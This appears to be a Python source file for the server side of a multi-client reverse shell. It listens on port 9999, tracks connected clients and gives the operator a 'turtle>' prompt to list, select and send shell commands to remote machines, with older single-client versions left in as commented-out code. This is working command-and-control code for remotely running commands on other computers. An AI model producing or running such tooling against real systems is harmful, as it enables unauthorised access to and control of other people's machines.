import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
conns = []
addrs = []

#create a socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print(f"error in creating socket: {str(msg)}")

#Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print(f"binding the port:{str(port)}")
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print(f"error in binding socket: {str(msg)} \n retrying...")
        bind_socket()
       
#first thread
#Handling connections from multiple clients and saving a list
#Closing previous connections when server.py is restarted
def accepting_connections():
    for c in conns:
        c.close()
    del conns[:]
    del addrs[:]
    
    while True:
        try:
            conn, addr=s.accept()
            s.setblocking(True)  #Prevents timeout
            conns.append(conn)
            addrs.append(addr)
            print("connection established")
        except:
            print("error accepting connections")
            
#second thread
#1.see all the clients
#2.select a client
#3.send commands to that client
def start_turtle():
    while(True):
        cmd = input("turtle>")
        if cmd=="list":
            list_connections()
        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif cmd == "close":
            s.close()
            break
            
#Display all current active connections with client
def list_connections():
    results = ""
    for i,conn in enumerate(conns):
        try:
            conn.send(str.encode(""))
            conn.recv(201480)
        except:
            del conns[i]
            del addrs[i]
            continue
        results = results + " " + str(i) + " " + str(addrs[i][0]) + " " + str(addrs[i][1]) + "\n"
    print(results)
            
#selecting a specific client from the list of clients
def get_target(x):
    try:
        target = x.replace("select ","") #obtain target id
        target = int(target)
        conn = conns[target]
        print(f"you're now connected to {addrs[target][0]}:{addrs[target][1]}")
        print(f"{addrs[target][0]}:{addrs[target][1]}>", end="")
        return conn
    except:
        print("invalid Selection")
        return None
    
#Send CMD commands to a friend
def send_target_commands(conn):
    while(True):
        try:
            cmd = input("enter command")
            if cmd=="quit":
                conn.close()
                break  
            if len(str.encode(cmd))>0:
                conn.send(str.encode(cmd))
                client_response1 = conn.recv(1024)
                client_response = client_response1.decode("utf-8")
                print(client_response, end = "")
        except:
            print("error sending commands")
            
        
def main():
    create_socket()
    print(s.type)
    bind_socket()
    t1 = threading.Thread(target=accepting_connections)
    t2 = threading.Thread(target=start_turtle)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    
main()
"""
#Establishing connection with a client(socket must be listening)
def socket_accept():
    conn,address=s.accept()
    print(f"connection established with {address}")
    send_commands(conn)
    conn.close()

#send commands to client
def send_commands(conn):
    while(True):
        cmd = input()
        if (cmd=="quit"):
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")
            
def main():
    create_socket()
    bind_socket()
    socket_accept()
main()
"""
'''
s = socket.socket()
host = ""
port = 9999
while True:
    s.bind((host,port))
    s.listen(5)
    conn,adder=s.accept()
    v = conn.recv(1024)
    print(str(v))
    conn.send(str.encode("hello to you too"))
    print(p)
    conn.close()
    x = input()
    if x=="close":
        s.close()
   '''   